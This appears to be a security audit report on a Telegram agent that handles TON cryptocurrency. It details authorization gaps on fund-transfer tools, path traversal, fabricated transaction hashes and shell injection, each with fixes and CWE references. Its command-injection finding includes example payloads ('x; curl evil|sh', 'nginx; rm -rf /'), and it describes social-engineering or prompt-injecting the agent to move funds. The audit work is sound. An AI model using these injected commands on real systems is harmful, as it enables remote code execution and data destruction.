## Description

The two money-moving tools `ton_send` and `jetton_send` are registered with scope `"dm-only"`:

```ts
// v1-src/agent/tools/ton/index.ts:35,43
export const tools: ToolEntry[] = [
  { tool: tonSendTool, executor: tonSendExecutor, scope: "dm-only" },
  // ...
  { tool: jettonSendTool, executor: jettonSendExecutor, scope: "dm-only" },
];
```

In the registry, `dm-only`, `group-only`, and `admin-only` are **mutually exclusive branches** — a tool has exactly one scope, and only the matching branch runs:

```ts
// v1-src/agent/tools/registry.ts:107-128
const scope = this.getEffectiveScope(toolCall.name);
if (scope === "dm-only" && context.isGroup) {
  return { success: false, error: `Tool "${toolCall.name}" is not available in group chats` };
}
if (scope === "group-only" && !context.isGroup) { /* ... */ }
if (scope === "admin-only") {
  const isAdmin = context.config?.telegram.admin_ids.includes(context.senderId) ?? false;
  if (!isAdmin) {
    return { success: false, error: `Tool "${toolCall.name}" is restricted to admin users` };
  }
}
```

Because `ton_send`/`jetton_send` have scope `"dm-only"`, the `dm-only` branch only rejects the call when `context.isGroup` is true; it never falls through to the `admin-only` branch (lines 120-128), and there is no sender allow-list check on the DM path. The per-group module permission block (lines 130-150) is also guarded by `if (context.isGroup ...)`, so it does not apply in DMs either. The net effect: **any** Telegram user who opens a direct message with the userbot can invoke `ton_send`/`jetton_send` and move real funds, subject only to the DM policy and the model's own judgement.

## Impact

A scope intended to restrict sensitive financial actions actually only blocks them in group chats while leaving them fully available to every DM sender. An attacker who can DM the bot (or social-engineer the agent in a DM) can trigger on-chain TON and jetton transfers from the bot's wallet. This is a direct, unauthenticated path to fund loss and is the highest-impact authorization gap in the V1 tree. The `admin_ids` allow-list that the operator reasonably expects to protect money tools is never consulted for these tools.

## Required Fix

1. Gate the money tools behind an admin/owner check on the DM path as well — e.g. register them with an additional admin requirement, or add an explicit `admin-only`-style check inside the DM branch so `ton_send`/`jetton_send` require `context.senderId` to be in `admin_ids` (or an explicit deals/owner allow-list) regardless of chat type.
2. Make scopes composable rather than mutually exclusive (e.g. allow a tool to be both `dm-only` and `admin-only`), or introduce a dedicated `owner-only` scope for financial tools, so that "DM only" does not implicitly mean "any DM user".
3. Add regression tests asserting that a non-admin DM sender is denied `ton_send`/`jetton_send`, and that an admin is allowed.

## References

- CWE-862: Missing Authorization — https://cwe.mitre.org/data/definitions/862.html
- CWE-269: Improper Privilege Management — https://cwe.mitre.org/data/definitions/269.html
- OWASP Top 10 2021 A01: Broken Access Control — https://owasp.org/Top10/A01_2021-Broken_Access_Control/

## Description

A deal asset carries two independent numeric fields: `tonAmount` (the literal amount to send/receive) and `valueTon` (an estimated TON value). `deal_propose` populates both from separate, unvalidated tool parameters:

```ts
// v1-src/agent/tools/deals/propose.ts:75-87
const userGives: AssetValue = {
  type: params.userGivesType,
  tonAmount: params.userGivesTonAmount,
  giftSlug: params.userGivesGiftSlug,
  valueTon: params.userGivesValueTon,
};
const agentGives: AssetValue = {
  type: params.agentGivesType,
  tonAmount: params.agentGivesTonAmount,
  giftSlug: params.agentGivesGiftSlug,
  valueTon: params.agentGivesValueTon,
};
```

The strategy/profit gate evaluates **only `valueTon`**, never `tonAmount`:

```ts
// v1-src/deals/strategy-checker.ts:36-38
const userValue = userGives.valueTon;
const agentValue = agentGives.valueTon;
const profit = userValue - agentValue;
```

but payment verification and the payout transfer both use `*_ton_amount` (the `tonAmount` columns), not the value that was strategy-checked:

```ts
// v1-src/agent/tools/deals/verify-payment.ts:103
betAmount: deal.user_gives_ton_amount,
// v1-src/deals/executor.ts:91-94
const txHash = await sendTon({
  toAddress: deal.user_payment_wallet,
  amount: deal.agent_gives_ton_amount,
  // ...
});
```

For a `type: "ton"` leg these two fields are supposed to denote the same quantity, but nothing enforces `tonAmount === valueTon`. They are stored as separate columns (`*_ton_amount` vs `*_value_ton`) and consumed by different code paths. A proposal where `agentGivesValueTon` is small (passes the strategy gate) but `agentGivesTonAmount` is large will be accepted as compliant, yet the executor sends the large `agent_gives_ton_amount`. Symmetrically, the amount the user is required to pay (`user_gives_ton_amount`) can differ from the `user_gives_value_ton` the profit calculation assumed.

## Impact

The strategy/profit guard — the code-level enforcement of STRATEGY.md trading rules — can be bypassed because it validates a different number than the one actually transferred and verified on-chain. A crafted or mistaken proposal can pass compliance while the agent pays out far more TON than the checked value (or accepts far less than expected), producing real financial loss and incorrect P&L journal entries. Because both fields are free parameters supplied at propose time, this is exploitable, not merely a theoretical mismatch.

## Required Fix

1. For `type: "ton"` legs, derive a single source of truth: set `valueTon` from `tonAmount` (or reject the proposal unless they are equal within a tolerance) in `deal_propose` before calling `checkStrategyCompliance`.
2. Ensure the strategy checker, payment verification, and executor all reference the **same** amount for TON legs (drive verification/transfer from the strategy-checked value, or validate equality at the DB-write boundary).
3. Add tests where `tonAmount` and `valueTon` diverge for a TON leg and assert the proposal is rejected (or normalized) so the checked amount always equals the transferred amount.

## References

- CWE-840: Business Logic Errors — https://cwe.mitre.org/data/definitions/840.html
- CWE-639: Authorization Bypass Through User-Controlled Key — https://cwe.mitre.org/data/definitions/639.html

## Description

The HTTPS Management API starts the server without specifying a `hostname`, so it binds to all interfaces (`0.0.0.0` / `::`) rather than localhost:

```ts
// v1-src/api/server.ts:424-433
this.server = serve(
  {
    fetch: this.app.fetch as Parameters<typeof serve>[0]["fetch"],
    port: this.config.port,
    createServer: createHttpsServer,
    serverOptions: { cert: tls.cert, key: tls.key },
  },
  (info) => { /* ... */ }
);
```

(For contrast, the WebUI server passes `hostname: this.deps.config.host`, which defaults to `127.0.0.1`; the Management API passes no hostname at all.) The IP allow-list that could compensate defaults to empty, which the auth middleware treats as "allow all":

```ts
// v1-src/config/schema.ts:234-237
allowed_ips: z
  .array(z.string())
  .default([])
  .describe("IP whitelist (empty = allow all authenticated requests)"),
```

Mounted under this server is a setup route that generates a new TON wallet and returns its 24-word mnemonic in the JSON response body:

```ts
// v1-src/webui/routes/setup.ts:242-257
app.post("/wallet/generate", async (c) => {
  const wallet = await generateWallet();
  saveWallet(wallet);
  return c.json({ success: true, data: { address: wallet.address, mnemonic: wallet.mnemonic } });
});
```

Requests to `/v1/*` do still require a Bearer API key (verified with a timing-safe comparison and a 10-attempt-per-IP lockout), so this is not unauthenticated. But the combination — listening on every interface, an allow-all IP default, and a sensitive endpoint that returns wallet seed material — substantially enlarges the remotely reachable attack surface for a high-value secret.

## Impact

With the default config the management plane is reachable from any network the host is attached to, with no IP restriction, and exposes an endpoint whose response contains a wallet mnemonic (full spending control of the generated wallet). An attacker on the same network/segment can reach the listener and attempt to brute-force or otherwise obtain the API key; success yields the mnemonic and thus the funds. Even absent key compromise, exposing the listener and the mnemonic-returning endpoint to all interfaces violates least-exposure principles for a financial secret. Severity **high**: authenticated, but a default-on-all-interfaces binding plus allow-all IPs plus a seed-returning endpoint is a serious exposure.

## Required Fix

1. Bind the Management API to a configurable host defaulting to `127.0.0.1` (pass `hostname` to `serve()`), as the WebUI server already does; require an explicit opt-in to bind non-loopback addresses.
2. Change the `allowed_ips` semantics so an empty list does **not** mean allow-all when the server is exposed beyond loopback (or default to loopback-only), and document the risk.
3. Avoid returning the mnemonic over the network: return only the address and persist/display the seed locally, or require an additional explicit confirmation and never log/return it once stored.

## References

- CWE-1327: Binding to an Unrestricted IP Address — https://cwe.mitre.org/data/definitions/1327.html
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor — https://cwe.mitre.org/data/definitions/200.html
- OWASP API Security Top 10 2023 API8: Security Misconfiguration — https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/

## Description

`validatePath()` computes containment lexically using `path.resolve`/`relative` and then checks only whether the **final** path component is itself a symlink:

```ts
// v1-src/workspace/validator.ts:109-142 (excerpt)
const relativePath = relative(WORKSPACE_ROOT, absolutePath);
if (relativePath.startsWith("..") || relativePath.startsWith("/")) {
  throw new WorkspaceSecurityError(/* outside workspace */);
}
// ...
if (exists) {
  const stats = lstatSync(absolutePath);
  if (stats.isSymbolicLink()) {
    throw new WorkspaceSecurityError(`Access denied: Symbolic links are not allowed ...`);
  }
}
```

The containment test runs against the lexically-resolved `absolutePath`, never against `fs.realpathSync(absolutePath)`. The symlink guard uses `lstatSync` on the leaf only. Two gaps follow: (1) an **intermediate** directory component can be a symlink that points outside the workspace — e.g. if `~/.teleton/workspace/sub` is a symlink to `/etc`, then `sub/passwd` resolves lexically to a path whose `relative()` is `sub/passwd` (inside), passes the check, and the leaf `passwd` is not itself a symlink, so the file outside the workspace is read/written. (2) For non-existent targets with `allowCreate = true`, the `exists` block is skipped entirely, so a write can follow a symlinked parent created out-of-band.

## Impact

The validator is documented as "the ONLY function that should be used to validate paths before any file operation" and is meant to prevent symlink attacks and access outside the workspace. Because it does not canonicalize via `realpath` before enforcing containment, an attacker (or the agent itself, under prompt injection) able to place a symlinked directory inside the workspace can read or overwrite files anywhere the process user can reach — including the sibling protected files `~/.teleton/config.yaml`, `wallet.json`, and `telegram_session.txt`. Severity **medium**: it requires the ability to create a symlink within the workspace first, but the workspace is agent-writable, so the precondition is reachable.

## Required Fix

1. Canonicalize before the containment check: resolve `fs.realpathSync` (or `realpathSync.native`) on the path — and for `allowCreate`, on the nearest existing ancestor — then verify the **real** path is inside `realpath(WORKSPACE_ROOT)`.
2. Reject any path whose realpath escapes the workspace, covering intermediate-symlink and not-yet-existing cases, not just a symlinked leaf.
3. Add tests with a symlinked intermediate directory and with `allowCreate` writes through a symlinked parent, asserting both are rejected.

## References

- CWE-59: Improper Link Resolution Before File Access ('Link Following') — https://cwe.mitre.org/data/definitions/59.html
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') — https://cwe.mitre.org/data/definitions/22.html
- OWASP Top 10 2021 A01: Broken Access Control — https://owasp.org/Top10/A01_2021-Broken_Access_Control/

## Description

After broadcasting a transfer, `sendTon()` returns a synthetic string built from the wallet seqno, a timestamp, and the amount — not the actual transaction hash:

```ts
// v1-src/ton/transfer.ts:87-91
const pseudoHash = `${seqno}_${Date.now()}_${amount.toFixed(2)}`;
log.info(`Sent ${amount} TON to ${toAddress.slice(0, 8)}... - seqno: ${seqno}`);
return pseudoHash;
```

The deal executor treats this return value as a real TX hash: it persists it to `agent_sent_tx_hash`, logs it to the business journal, and reports it to the counterparty in chat as the transaction hash:

```ts
// v1-src/deals/executor.ts:91-122 (excerpts)
const txHash = await sendTon({ toAddress: deal.user_payment_wallet, amount: deal.agent_gives_ton_amount, /* ... */ });
// ...
db.prepare(`UPDATE deals SET status = 'completed', agent_sent_tx_hash = ?, completed_at = unixepoch() WHERE id = ?`).run(txHash, dealId);
// ...
await bridge.sendMessage({ chatId: deal.chat_id, text: `... TX Hash: \`${txHash}\` ...` });
```

The value `"<seqno>_<ms>_<amount>"` is not a TON transaction hash and cannot be looked up on any explorer or reconciled against the chain.

## Impact

Every completed TON-payout deal stores and advertises an unverifiable, fabricated "TX hash". Counterparties are shown a string that cannot be validated on-chain, undermining trust and disputability; the business journal's `tx_hash` is likewise useless for audit, reconciliation, or P&L verification. Operationally there is no record linking a completed deal to its real on-chain transaction. Severity **medium**: funds do move, but the integrity/auditability of financial records is broken.

## Required Fix

1. Capture the real transaction identity: compute the external-message hash from the signed transfer (e.g. derive the message cell hash before/while sending), or poll the wallet's account transactions for the matching outgoing message and return its on-chain hash.
2. Have `sendTon()` return the real hash (or `null` on failure) and ensure the executor stores/reports only verified hashes.
3. Add a test asserting the returned value is a valid hash format (not the `seqno_ms_amount` placeholder) and is resolvable against the transaction the call produced.

## References

- CWE-345: Insufficient Verification of Data Authenticity — https://cwe.mitre.org/data/definitions/345.html
- TON documentation: message hashes and transaction lookup — https://docs.ton.org/

## Description

`runCommand` executes its argument through a shell:

```ts
// v1-src/agent/tools/exec/runner.ts:20
const child = spawn("bash", ["-c", command], { detached: true, /* ... */ });
```

Both `exec_install` and `exec_service` build that `command` string by interpolating tool input without any sanitization or quoting. `exec_install` concatenates the free-form `packages` string:

```ts
// v1-src/agent/tools/exec/install.ts:13-18,51
const INSTALL_COMMANDS: Record<string, (pkgs: string) => string> = {
  apt: (pkgs) => `apt install -y ${pkgs}`,
  pip: (pkgs) => `pip install ${pkgs}`,
  npm: (pkgs) => `npm install -g ${pkgs}`,
  docker: (pkgs) => `docker pull ${pkgs}`,
};
// ...
const command = buildCommand(packages);
```

`exec_service` interpolates the free-form service `name`:

```ts
// v1-src/agent/tools/exec/service.ts:42
const command = `systemctl ${action} ${name}`;
```

`action` is constrained by a TypeBox enum, but `packages` and `name` are arbitrary strings. A value such as `packages = "x; curl evil|sh"` or `name = "nginx; rm -rf /"` injects additional shell commands into the `bash -c` invocation.

## Impact

Whoever can invoke these tools can execute arbitrary shell commands beyond the intended install/service operation via metacharacters (`;`, `&&`, `|`, backticks, `$(...)`). While the exec capability is admin-gated and off by default, these two tools nominally present a *constrained* surface ("install a package", "manage a service") that is in fact equivalent to full `exec_run`. This breaks the principle of least privilege for the capability and turns a narrow tool into arbitrary command execution; combined with the unenforced `allowlist` scope it is a meaningful hardening gap. Severity **medium**: gated to admins, but a clear injection in a host-command path.

## Required Fix

1. Avoid the shell: spawn the binary directly with an argv array (e.g. `spawn("systemctl", [action, name])`, `spawn("apt", ["install", "-y", ...packages])`) so arguments are never re-parsed by `bash -c`.
2. If a shell is unavoidable, validate/escape inputs strictly — allow only `[A-Za-z0-9._@:+-]` (and split package lists into validated tokens) and reject anything containing shell metacharacters.
3. Add tests with metacharacter-laden `packages`/`name` values asserting no injected command runs.

## References

- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') — https://cwe.mitre.org/data/definitions/78.html
- OWASP Command Injection — https://owasp.org/www-community/attacks/Command_Injection

## Description

The root data directory `~/.teleton` (which holds `wallet.json`, `telegram_session.txt`, and `config.yaml` — see `v1-src/workspace/manager.ts:102-104`) is created without an explicit `mode`, so it inherits the default directory permissions (typically `0755` after a standard umask), making it world-readable/traversable:

```ts
// v1-src/workspace/manager.ts:57-66
// Create base teleton directory
if (!existsSync(TELETON_ROOT)) {
  mkdirSync(TELETON_ROOT, { recursive: true });
  if (!silent) log.info(`Created Teleton root at ${TELETON_ROOT}`);
}
// Create workspace directory
if (!existsSync(WORKSPACE_ROOT)) {
  mkdirSync(WORKSPACE_ROOT, { recursive: true });
  if (!silent) log.info(`Created workspace at ${WORKSPACE_ROOT}`);
}
```

A separate hardening pass (`v1-src/workspace/harden-permissions.ts`) chmods individual *files* to `0600` and a few named subdirectories (`secrets`, `plugins`, `tls`) to `0700`, but it never tightens `TELETON_ROOT` or `WORKSPACE_ROOT` themselves. So the directory mode of the secrets-bearing root is left at the OS default at creation and is not corrected afterwards.

## Impact

On a multi-user host, other local users can traverse and list `~/.teleton`, enumerating sensitive filenames and the workspace contents. The most sensitive files are separately chmod'd to `0600` (so their contents are protected once hardening runs), which is why this is **low** rather than higher — but directory metadata leakage and the absence of a defense-in-depth `0700` on the directory containing wallet/session/credentials is a real hardening gap, especially before the file-level hardening executes.

## Required Fix

1. Create the data directories with a restrictive mode: `mkdirSync(TELETON_ROOT, { recursive: true, mode: 0o700 })` (and the same for `WORKSPACE_ROOT`), and verify the mode is enforced (umask can mask `mkdir` mode bits — follow with an explicit `chmodSync(..., 0o700)`).
2. Extend `hardenExistingPermissions()` to also chmod `TELETON_ROOT` (and `WORKSPACE_ROOT`) to `0700` so existing installs are corrected.
3. Add a test asserting the created root directory mode is `0700`.

## References

- CWE-276: Incorrect Default Permissions — https://cwe.mitre.org/data/definitions/276.html
- CWE-732: Incorrect Permission Assignment for Critical Resource — https://cwe.mitre.org/data/definitions/732.html
- OWASP Top 10 2021 A01: Broken Access Control — https://owasp.org/Top10/A01_2021-Broken_Access_Control/
